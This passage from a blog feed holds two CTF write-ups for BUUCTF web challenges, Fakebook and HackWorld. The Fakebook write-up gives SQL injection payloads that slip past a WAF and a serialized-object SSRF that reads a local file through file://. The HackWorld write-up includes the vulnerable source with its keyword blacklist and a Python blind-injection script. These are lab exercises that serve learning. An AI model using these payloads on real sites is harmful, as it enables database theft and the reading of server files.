    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/1.png" alt="1"></p><p>the Fakebook</p><p>有login和join两个选项，join应该是注册，我们先尝试注册</p><p>注册成功之后直接登录</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/2.png" alt="2"></p><p>username这里可以点进去，进去之后是这样的</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/3.png" alt="3"></p><p>url格式是/view.php?no=1，猜测可以进行注入</p><p>当我们尝试进行注入的时候，发现有waf，当出现有union select的时候就会被拦截</p><p>这里用/**/代替空格进行绕过</p><p>/view.php?no=0 union/**/select 1,2,3,4–+的时候回显</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/4.png" alt="4"></p><p>/view.php?no=0 union/**/select 1,database(),3,4–+得到数据库名fakebook</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/5.png" alt="5"></p><p>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名user</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/6.png" alt="6"></p><p>/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/7.png" alt="7"></p><p>/view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/8.png" alt="8"></p><p>1d1a05b40f186efa8c4152341eb69a1c8ac32ea0c3d76d6d071427a902ed8ec88c320f54ca1d4e8301a9a43746c74826d2c9113dc30ff93a68e7eda21aa5d94ab4e69O:8:”UserInfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:11:”<a href="http://www.d1a0.cn&quot;;}" target="_blank" rel="noopener">www.d1a0.cn&quot;;}</a> </p><p>这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt</p><p>robots.txt中存在</p><pre><code>User-agent: *Disallow: /user.php.bak</code></pre><p>下载得到</p><pre><code class="PHP">&lt;?phpclass UserInfo{    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    {        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    }    function get($url)    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) {            return 404;        }        curl_close($ch);        return $output;    }    public function getBlogContents ()    {        return $this-&gt;get($this-&gt;blog);    }    public function isValidBlog ()    {        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    }}</code></pre><p>构造payload</p><pre><code class="PHP">&lt;?phpclass Userinfo{    public $name = &quot;d1a0&quot;;    public $age = 111;    public $blog = &quot;file:///var/www/html/flag.php&quot;;}$data = new Userinfo();echo serialize($data);?&gt;</code></pre><p>/view.php?no=0 union/**/select 1,2,3,’O:8:”Userinfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p><p><img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/9.png" alt="9"></p><p>看大佬们的博客，还有个非预期解</p><p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 </p><p>payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p><p>太棒了，又学到了许多<img data-action="zoom" src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/10.jpg" alt="10"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019华北赛区Day2-HackWorld</title>
    <link href="https://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/"/>
    <id>https://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/</id>
    <published>2020-06-19T02:23:00.000Z</published>
    <updated>2020-07-15T09:48:38.436Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img data-action="zoom" src="/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/1.png" alt="1"></p><p>结合提示，是个sql注入类型的题目，尝试注入测试</p><p>输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend.  输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result.</p><p>能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧</p><pre><code class="php">&lt;?php$dbuser=&#39;root&#39;;$dbpass=&#39;root&#39;;function safe($sql){    #被过滤的内容 函数基本没过滤    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);    foreach($blackList as $blackitem){        if(stripos($sql,$blackitem)){            return False;        }    }    return True;}if(isset($_POST[&#39;id&#39;])){    $id = $_POST[&#39;id&#39;];}else{    die();}$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db){    die(mysql_error());}   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id)){    $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;);    if($query){        $result = mysql_fetch_array($query);        if($result){            echo $result[&#39;content&#39;];        }else{            echo &quot;Error Occured When Fetch Result.&quot;;        }    }else{        var_dump($query);    }}else{    die(&quot;SQL Injection Checked.&quot;);}</code></pre><p>可以看到过滤了空格等很多东西，但是也有很多东西没过滤</p><p>因为我能力有限，还是研究师傅们的代码吧</p><pre><code class="python">import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload={    &quot;id&quot; : &quot;&quot;}for i in range(0,60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))        s = requests.post(url,data=payload)        #print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><p>但是这个代码我运行的时候报错，所以删掉了<code>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)</code></p><p>能够正常运行，得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
</feed>
